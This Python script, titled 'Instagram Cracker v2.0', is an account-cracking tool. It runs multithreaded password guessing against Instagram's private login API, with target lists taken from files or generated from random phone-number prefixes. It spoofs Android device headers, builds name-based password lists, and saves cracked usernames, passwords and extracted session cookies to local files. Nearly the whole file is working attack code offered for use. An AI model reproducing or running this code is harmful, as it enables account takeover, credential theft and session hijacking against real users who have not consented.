#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""
import hashlib
import uuid
import time
import urllib.parse
import random
import requests
import re
import json
import base64
import random
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Color codes
G1 = "\033[1;92m"  # Green
G2 = "\033[1;96m"  # Cyan
A = "\033[1;97m"   # White

# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
methods = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

class main_crack:
    def __init__(self):
        self.retry_count = 0
        self.max_retries = 3
        self.id = []
        self.file = ""
        self.password_list = []
    
    def crack(self, id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/AJ.txt')
        linex()
        os.system('espeak -a 150 " ENTER YOUR FILE NAME"')
        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
        try:
            # Use context manager for better file handling
            with open(self.file, 'r', encoding='utf-8', errors='ignore') as f:
                self.id = f.read().splitlines()
            
            # Check if file has content
            if not self.id:
                print(f'{G1}[{A}={G2}]{G2} FILE IS EMPTY...')
                time.sleep(2)
                self.retry_crack(id)
                return
                
            # Get password list
            self.get_passwords()
            self.pasw()
            
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}]{G2} OPPS FILE NOT FOUND ...')
            time.sleep(2)
            self.retry_crack(id)
            
        except PermissionError:
            print(f'{G1}[{A}={G2}]{G2} PERMISSION DENIED ...')
            time.sleep(2)
            self.retry_crack(id)
            
        except Exception as e:
            print(f'{G1}[{A}={G2}]{G2} ERROR: {str(e)}')
            time.sleep(2)
            self.retry_crack(id)
    
    def get_passwords(self):
        """Get password list from user"""
        clear()
        print(f'{G1}[{A}={G1}]{G1} PASSWORD PATTERN SETUP')
        linex()
        print(f'{G1}[{A}1{G2}]{G2} Default Password List')
        print(f'{G1}[{A}2{G2}]{G2} Custom Password File')
        print(f'{G1}[{A}3{G2}]{G2} Manual Entry')
        linex()
        
        choice = input(f'{G1}[{A}?{G2}]{G2} Select Option {A}:{G2} ')
        
        if choice == '1':
            # Default password list
            self.password_list = [
                "firstlast", "FirstLast", "first123", "First123",
                "firstlast123", "FirstLast123", "lastfirst", "LastFirst",
                "name123", "Name123", "firstname", "FirstName",
                "lastname", "LastName", "123456", "12345678",
                "password", "Password", "admin", "Admin",
                "iloveyou", "Iloveyou", "qwerty", "Qwerty",
                "welcome", "Welcome", "monkey", "Monkey"
            ]
            print(f'{G1}[{A}+{G2}]{G2} Loaded {len(self.password_list)} default passwords')
            
        elif choice == '2':
            # Load from file
            pass_file = input(f'{G1}[{A}?{G2}]{G2} Password File Name {A}:{G2} ')
            try:
                with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
                    self.password_list = [line.strip() for line in f if line.strip()]
                print(f'{G1}[{A}+{G2}]{G2} Loaded {len(self.password_list)} passwords from file')
            except:
                print(f'{G1}[{A}!{G2}]{G2} Failed to load file, using default')
                self.password_list = ["123456", "password", "12345678", "qwerty"]
                
        elif choice == '3':
            # Manual entry
            print(f'{G1}[{A}+{G2}]{G2} Enter passwords (comma separated)')
            manual_pass = input(f'{G1}[{A}?{G2}]{G2} Passwords {A}:{G2} ')
            self.password_list = [p.strip() for p in manual_pass.split(',')]
            print(f'{G1}[{A}+{G2}]{G2} Loaded {len(self.password_list)} passwords')
            
        else:
            print(f'{G1}[{A}!{G2}]{G2} Invalid choice, using default')
            self.password_list = ["123456", "password"]
            
        time.sleep(2)
    
    def generate_passwords_for_user(self, user_info):
        """Generate password patterns for a specific user"""
        passwords = []
        
        # Extract user info
        if '|' in user_info:
            parts = user_info.split('|')
            uid = parts[0].strip()
            if len(parts) > 1:
                name = parts[1].strip()
            else:
                name = uid
        else:
            uid = user_info.strip()
            name = uid
        
        # Split name into first and last if possible
        name_parts = name.split()
        if len(name_parts) >= 2:
            fs = name_parts[0]  # First name
            ls = name_parts[-1]  # Last name
        else:
            fs = name
            ls = name
        
        # Generate passwords using patterns
        for pw in self.password_list:
            # Replace patterns in password
            ps = pw.replace('first', fs.lower()).replace('First', fs)
            ps = ps.replace('last', ls.lower()).replace('Last', ls)
            ps = ps.replace('name', name.lower()).replace('Name', name)
            
            # Add numeric variations
            passwords.extend([
                ps,
                ps + "123",
                ps + "1234",
                ps + "12345",
                ps + "123456",
                ps + "@123",
                ps + "!@#",
                ps + "2024",
                ps + "2023",
                ps + "2022",
            ])
        
        # Add UID-based passwords
        passwords.extend([
            uid,
            uid[:6],
            uid[:8],
            fs.lower(),
            fs.lower() + "123",
            ls.lower(),
            ls.lower() + "123",
            name.lower(),
            name.lower() + "123",
        ])
        
        # Remove duplicates
        return list(set(passwords))
    
    def pasw(self):
        """Password cracking method"""
        clear()
        print(f'\n{G1}[{A}+{G1}]{G1} LOADING {len(self.id)} IDS...')
        print(f'{G1}[{A}+{G1}]{G1} PASSWORD PATTERNS: {len(self.password_list)}')
        linex()
        
        # Reset counters
        global loop, oks, cps
        with counter_lock:
            loop = 0
        with success_lock:
            oks.clear()
        cps.clear()
        
        total_users = len(self.id)
        start_time = time.time()
        
        # Process each user
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for user_info in self.id:
                # Generate passwords for this user
                user_passwords = self.generate_passwords_for_user(user_info)
                
                # Get UID
                if '|' in user_info:
                    uid = user_info.split('|')[0].strip()
                else:
                    uid = user_info.strip()
                
                # Submit task
                future = executor.submit(
                    self.crack_single_user, 
                    uid, 
                    user_passwords, 
                    total_users
                )
                futures.append(future)
            
            # Wait for completion
            for future in as_completed(futures):
                try:
                    future.result()
                except KeyboardInterrupt:
                    print(f"\n{G1}[{A}!{G2}]{G2} Interrupted by user!")
                    executor.shutdown(wait=False)
                    break
                except Exception as e:
                    print(f"\n{G1}[{A}!{G2}]{G2} Error: {e}")
        
        # Display results
        end_time = time.time()
        execution_time = end_time - start_time
        
        clear()
        print(f"\n{G1}[{A}={G1}]{G1} CRACKING COMPLETED!")
        linex()
        print(f"{G1}[{A}✓{G2}]{G2} Total Users: {total_users}")
        print(f"{G1}[{A}✓{G2}]{G2} Success: {len(oks)}")
        print(f"{G1}[{A}✗{G2}]{G2} Failed: {len(cps)}")
        print(f"{G1}[{A}⏱️{G2}]{G2} Time: {execution_time:.2f}s")
        print(f"{G1}[{A}🚀{G2}]{G2} Speed: {total_users/execution_time:.2f} users/s")
        linex()
        
        if len(oks) > 0:
            print(f"{G1}[{A}🎉{G2}]{G2} SUCCESSFUL ACCOUNTS SAVED!")
            # Show first few successes
            print(f"{G1}[{A}+{G2}]{G2} First 5 successes:")
            for i, uid in enumerate(oks[:5]):
                print(f"  {G1}[{A}{i+1}{G2}]{G2} {uid}")
        
        input(f"\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...")
    
    def crack_single_user(self, uid, passwords, total_users):
        """Crack a single user account"""
        with counter_lock:
            global loop
            loop += 1
            progress = loop
            percentage = (progress / float(total_users) * 100) if total_users > 0 else 0
        
        colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m"]
        color = random.choice(colors)
        
        sys.stdout.write(f"\r{color}[FILE CRACK] {progress}/{total_users} [{percentage:.1f}%] - {uid}")
        sys.stdout.flush()
        
        # Try to crack with each password
        for pw in passwords[:50]:  # Limit to first 50 passwords for speed
            if self.try_login(uid, pw):
                with success_lock:
                    oks.append(uid)
                return True
        
        with success_lock:
            cps.append(uid)
        return False
    
    def try_login(self, uid, pw):
        """Try to login with given credentials"""
        try:
            session = requests.Session()
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            family_device_id = str(uuid.uuid4())
            
            # Generate hashes
            first_hash = hashlib.md5()
            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
            first_hex = first_hash.hexdigest()
            
            second_hash = hashlib.md5()
            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
            android_id_hash = second_hash.hexdigest()[:16]
            
            # User agent
            useragent = f'Instagram {random.randint(111, 999)}.0.0.{random.randint(1, 99)}.{random.randint(1, 9)} Android ({random.randint(21, 31)}/{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}; {random.randint(280, 1080)}x{random.randint(720, 1920)}; samsung; SM-G973F; samsung; {random.choice(["exynos9820", "sm6150"])}; en_US; {random.randint(100000000, 999999999)})'
            
            # Headers
            headers = {
                'user-agent': useragent,
                'x-ig-device-id': device_id,
                'x-ig-family-device-id': family_device_id,
                'x-ig-android-id': f'android-{android_id_hash}',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            
            # Prepare login data
            timestamp = int(time.time())
            encoded_username = urllib.parse.quote(uid)
            encoded_password = urllib.parse.quote(pw)
            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
            
            # Simplified params for faster testing
            params_dict = {
                "username": encoded_username,
                "password": encrypted_password,
                "device_id": f"android-{android_id_hash}",
            }
            
            params_json = json.dumps(params_dict)
            encoded_params = urllib.parse.quote(params_json)
            encode = f'params={encoded_params}'
            
            # Make request
            response = session.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=encode,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200 and 'logged_in_user' in response.text:
                print(f"\n{G1}[{A}✓{G2}]{G2} SUCCESS: {uid} | {pw}")
                self.save_success(uid, pw, response.text)
                return True
                
        except Exception:
            pass
        
        return False
    
    def save_success(self, uid, pw, response_text):
        """Save successful login"""
        try:
            # Try to extract cookies
            cookies = ""
            if 'sessionid' in response_text:
                match = re.search(r'"sessionid":"([^"]+)"', response_text)
                if match:
                    cookies = f"sessionid={match.group(1)}"
            
            # Save to file
            with open("/sdcard/SUCCESS_ACCOUNTS.txt", "a", encoding='utf-8') as f:
                f.write(f"{uid}|{pw}|{cookies}\n")
                
        except Exception:
            pass
    
    def retry_crack(self, id):
        """Helper method to retry the crack process"""
        self.retry_count += 1
        if self.retry_count >= self.max_retries:
            print(f'{G1}[{A}={G2}]{G2} MAXIMUM RETRIES REACHED. RETURNING TO MENU...')
            time.sleep(2)
            return
            
        os.system('clear')
        print(logo)
        print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
        time.sleep(2)
        self.crack(id)

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
            sys.stdout.flush()
            
            # Create session and generate device hash
            session = requests.Session()
            # Generate device ID and other required IDs
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            family_device_id = str(uuid.uuid4())
        
            # First hash for username+password
            first_hash = hashlib.md5()
            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
            first_hex = first_hash.hexdigest()
        
            # Second hash with salt for device ID
            second_hash = hashlib.md5()
            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
            android_id_hash = second_hash.hexdigest()[:16]
        
            # Generate user agent
            useragent = f'Instagram {random.randint(111, 999)}.0.0.{random.randint(1, 99)}.{random.randint(1, 9)} Android ({random.randint(21, 31)}/{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}; {random.randint(280, 1080)}x{random.randint(720, 1920)}; samsung; SM-G973F; samsung; {random.choice(["exynos9820", "sm6150"])}; en_US; {random.randint(100000000, 999999999)})'
            
            headers = {
            'host': 'i.instagram.com',
            'x-ig-app-locale': 'in_ID',
            'x-ig-device-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
            'x-pigeon-rawclienttime': f'{time.time():.3f}',
            'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            'x-ig-www-claim': '0',
            'x-bloks-is-prism-enabled': 'false',
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-device-id': device_id,
            'x-ig-family-device-id': family_device_id,
            'x-ig-android-id': f'android-{android_id_hash}',
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-ig-capabilities': '3brTv10=',
            'priority': 'u=3',
            'user-agent': useragent,
            'accept-language': 'id-ID, en-US',
            'x-mid': '',
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
            'x-ig-app-id': '3419628305025917',
            'connection': 'keep-alive'
            }
            # Generate timestamp for password
            timestamp = int(time.time())
        
            # URL encode username and password
            encoded_username = urllib.parse.quote(uid)
            encoded_password = urllib.parse.quote(pw)
        
            # Generate encrypted password format
            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
            # Prepare the encoded data
            params_dict = {
            "client_input_params": {
                "device_id": f"android-{android_id_hash}",
                "login_attempt_count": 1,
                "secure_family_device_id": "",
                "machine_id": "",
                "accounts_list": [],
                "auth_secure_device_id": "",
                "password": encrypted_password,
                "family_device_id": family_device_id,
                "fb_ig_device_id": [],
                "device_emails": [],
                "try_num": 3,
                "event_flow": "login_manual",
                "event_step": "home_page",
                "openid_tokens": {},
                "client_known_key_hash": "",
                "contact_point": encoded_username,
                "encrypted_msisdn": ""
            },
            "server_params": {
                "username_text_input_id": "p5hbnc:46",
                "device_id": f"android-{android_id_hash}",
                "should_trigger_override_login_success_action": 0,
                "server_login_source": "login",
                "waterfall_id": str(uuid.uuid4()),
                "login_source": "Login",
                "INTERNAL__latency_qpl_instance_id": 152086072800150,
                "reg_flow_source": "login_home_native_integration_point",
                "is_platform_login": 0,
                "is_caa_perf_enabled": 0,
                "credential_type": "password",
                "family_device_id": family_device_id,
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "INTERNAL_INFRA_THEME": "harm_f",
                "password_text_input_id": "p5hbnc:47",
                "ar_event_source": "login_home_page"
            }
        }
            # Convert params to JSON string and URL encode
            params_json = json.dumps(params_dict)
            encoded_params = urllib.parse.quote(params_json)
        
            # Prepare the complete encoded string
            encode = f'params={encoded_params}&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
        
            # Update content-length in headers
            headers['content-length'] = str(len(encode))
            # login url 
            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
            # Make API request
            response = session.post(
                url, 
                data=encode, 
                headers=headers, 
                allow_redirects=True
            )
            # Check response
            if 'logged_in_user' in response.text:
                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
                   decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
                   cookies = ';'.join(f'{k}={v}' for k,v in decoded.items())
                   print(cookies)
                   open("/sdcard/SUMON_INS_TTTTT.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
                   with success_lock:
                       oks.append(uid)
                   return True       
            elif 'challenge_required' in response.text:
                open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
                with success_lock:
                    cps.append(uid)
                continue
            elif 'checkpoint_required' in response.text:
                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
                with success_lock:
                    cps.append(uid)
                continue
            else:
                continue
                
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        return False
    
    return False

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    # Extract name parts from UID if available
    # For random numbers, use numeric patterns
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        '57273200',  # Static common password
        '123456',
        '12345678',
        'password',
        uid + '123',
        uid[:4] + '1234',
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def file_crack():
    """File-based cracking option"""
    cracker = main_crack()
    cracker.crack(0)

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📁 File-Based Cracking")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            file_crack()
        elif choice == '3':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '4':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, 3, or 4.")
            time.sleep(2)

# ASCII logo
logo = f"""
{G1}╔══════════════════════════════════════════════════════╗
{G1}║    ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗    ║
{G1}║    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝    ║
{G1}║    ██║██╔██╗ ██║███████╗   ██║   ███████║██║         ║
{G1}║    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║         ║
{G1}║    ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╗    ║
{G1}║    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ║
{G1}║    {A}Instagram Cracker v2.0 - Enhanced Edition       {G1}║
{G1}║    {A}Author: BITHIKA - All rights reserved           {G1}║
{G1}╚══════════════════════════════════════════════════════╝
"""

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Display logo
        clear()
        print(logo)
        time.sleep(2)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
